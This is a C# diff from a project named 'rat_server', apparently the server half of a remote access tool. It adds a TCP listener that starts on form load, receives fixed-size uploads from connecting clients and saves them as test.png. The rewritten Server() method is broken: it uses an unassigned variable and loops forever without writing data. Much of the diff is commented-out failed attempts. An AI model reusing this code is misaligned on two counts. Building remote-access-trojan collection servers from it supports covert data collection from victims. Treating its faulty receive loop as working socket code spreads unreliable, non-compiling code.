@@ -21,7 +21,113 @@ namespace rat_server
             InitializeComponent();
         }
 
-        public static void ExampleServer()
+        public static void ExampleServer() {
+            // Establish the local endpoint  
+            // for the socket. Dns.GetHostName 
+            // returns the name of the host  
+            // running the application. 
+            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
+            IPAddress ipAddr = IPAddress.Parse("172.31.244.16");
+            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);
+
+            // Creation TCP/IP Socket using  
+            // Socket Class Costructor 
+            Socket listener = new Socket(ipAddr.AddressFamily,
+                         SocketType.Stream, ProtocolType.Tcp);
+
+            try
+            {
+
+                // Using Bind() method we associate a 
+                // network address to the Server Socket 
+                // All client that will connect to this  
+                // Server Socket must know this network 
+                // Address 
+                listener.Bind(localEndPoint);
+
+                // Using Listen() method we create  
+                // the Client list that will want 
+                // to connect to Server 
+                listener.Listen(10);
+
+                while (true)
+                {
+
+                    Console.WriteLine("Waiting connection ... ");
+
+                    // Suspend while waiting for 
+                    // incoming connection Using  
+                    // Accept() method the server  
+                    // will accept connection of client 
+                    Socket clientSocket = listener.Accept();
+
+                    int size = 500000;
+                    var fileBuffer = new byte[size];
+                    var receiveBuffer = new byte[2048];
+                    var bytesLeftToReceive = size;
+                    var fileOffset = 0;
+                    while (bytesLeftToReceive > 0)
+                    {
+                        //receive
+                        var bytesRead = clientSocket.Receive(receiveBuffer);
+                        if (bytesRead == 0)
+                            throw new InvalidOperationException("Remote endpoint disconnected");
+                        //if the socket is used for other things after the file transfer
+                        //we need to make sure that we do not copy that data
+                        //to the file
+                        int bytesToCopy = Math.Min(bytesRead, bytesLeftToReceive);
+                        // copy data from our socket buffer to the file buffer.
+                        //Buffer.BlockCopy(receiveBuffer, 0, bytesLeftToReceive, fileBuffer, fileOffset);
+                        Buffer.BlockCopy(receiveBuffer, 0, fileBuffer, fileOffset, bytesToCopy);
+                        //move forward in the file buffer
+                        fileOffset += bytesToCopy;
+                        //update our tracker.
+                        bytesLeftToReceive -= bytesToCopy;
+                    }
+
+                    File.WriteAllBytes("test.png", fileBuffer);
+
+                    //byte[] bytes = new Byte[1000000];
+                    //string data = null;
+                    //int numByte = clientSocket.Receive(bytes);
+                    //while (true)
+                    //{
+                    //    using (var fs = new FileStream("test.png", FileMode.Create, FileAccess.Write))
+                    //    {
+                    //        fs.Write(bytes, 0, numByte);
+
+                    //    }
+                    //    break;
+                    //}
+
+                    Console.WriteLine("We done");
+                    
+                    //Console.WriteLine("Text received -> {0} ", data);
+                    //byte[] message = Encoding.ASCII.GetBytes("Test Server");
+
+                    // Send a message to Client  
+                    // using Send() method 
+                    //clientSocket.Send(message);
+
+                    // Close client Socket using the 
+                    // Close() method. After closing, 
+                    // we can use the closed Socket  
+                    // for a new Client Connection 
+                    clientSocket.Shutdown(SocketShutdown.Both);
+                    clientSocket.Close();
+                }
+            
+            }
+
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+        }
+
+
+    
+        public static void Server()
         {
             // Establish the local endpoint  
             // for the socket. Dns.GetHostName 
@@ -61,76 +167,30 @@ namespace rat_server
                     // Accept() method the server  
                     // will accept connection of client 
                     Socket clientSocket = listener.Accept();
-                    var output = File.Create("test.zip");
-                    int c = 0;
-                    byte[] buffer = new byte[2048];
-                    clientSocket.Receive(buffer);
-                    while (clientSocket.Receive(buffer) > 0) {
-                        output.Write(buffer, 0, c);    
+
+                    byte[] bytes = new byte[2048];
+                    int bytesRead;
+                    var output = File.Create("test.txt") ; 
+                    while (true) {
+                            clientSocket.Receive(bytes);                 
                     }
+                    output.Write(bytes, 0, bytesRead);
 
-                    // Data buffer 
-
-                    //string data = null;
-
-
-                    /*   using (var output = File.Create("test.zip"))
-                       {
-                       Console.WriteLine("Client connected. Starting to receive the file");
-                       // read the file in chunks of 1KB
-                       var buffer = new byte[1024];
-                       Console.WriteLine("stuff happening1");
-                       int bytesRead = 1024;
-                       Console.WriteLine("stuff happening2");
-                       clientSocket.Receive(buffer);
-                       Console.WriteLine("stuff happening3");
-                       while (buffer != null )
-                       {
-                           Console.WriteLine("stuff happening4");
-                           output.Write(buffer, 0, bytesRead);
-                           Console.WriteLine("stuff happening5");
-                       }
-                    /*
-                    Console.WriteLine("stuff happening1");
-                    File.Create("test.zip");
-                    Console.WriteLine("stuff happening2");
-                    clientSocket.Receive(bytes);
-                    Console.WriteLine("stuff happening3");
-                    File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "test.txt"), bytes);
-                    Console.WriteLine("File Received");
-                    */
-
-                    //File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "test.txt"), bytes);
-                    //File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "test.png"), bytes);
-                    //ZipOutputStream stream = new ZipOutputStream(Path.Combine(Directory.GetCurrentDirectory(), "test.zip"));
-                    //FileStream s1 = new FileStream(Path.Combine(Directory.GetCurrentDirectory(), "test.zip"), FileMode.OpenOrCreate);
-
-                    //while (true)
+                    //using (var output = File.Create("test.txt"))
                     //{
+                    //    Console.WriteLine("Client connected. Starting to receive the file");
 
-                    //    int numByte = clientSocket.Receive(bytes);
-
-                    //    s1.Write(clientSocket.Receive(bytes), 0, 1048576);
-
-                    //    if (data.IndexOf("<EOF>") > -1)
-                    //        break;
+                    //    // read the file in chunks of 1KB
+                    //    var buffer = new byte[2048];
+                    //    int bytesRead;
+                    //    while ((bytesRead = listener.Receive(buffer, 0, SocketFlags.None)) > 0)
+                    //    {
+                    //        output.Write(buffer, 0, bytesRead);
+                    //    }
                     //}
 
-                    //stream.Close();
-
-                   // Console.WriteLine("Text received -> {0} ", data);
-                    //byte[] message = Encoding.ASCII.GetBytes("Test Server");
-
-                  //  File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "test.zip"), bytes);
-
-                    // Send a message to Client  
-                    // using Send() method 
-                   // clientSocket.Send(message);
-
-                    // Close client Socket using the 
-                    // Close() method. After closing, 
-                    // we can use the closed Socket  
-                    // for a new Client Connection 
+                    Console.WriteLine("We Done");
+                    
                     clientSocket.Shutdown(SocketShutdown.Both);
                     clientSocket.Close();
                 }
@@ -222,7 +282,7 @@ namespace rat_server
         }
         private void Form1_Load(object sender, EventArgs e)
         {
-            //  ExecuteServer();
+            ExampleServer();
         }
 
         private void Button1_Click(object sender, EventArgs e)
@@ -242,7 +302,7 @@ namespace rat_server
 
         private void button4_Click(object sender, EventArgs e)
         {
-            ExampleServer();
+            
         }
     }
 }
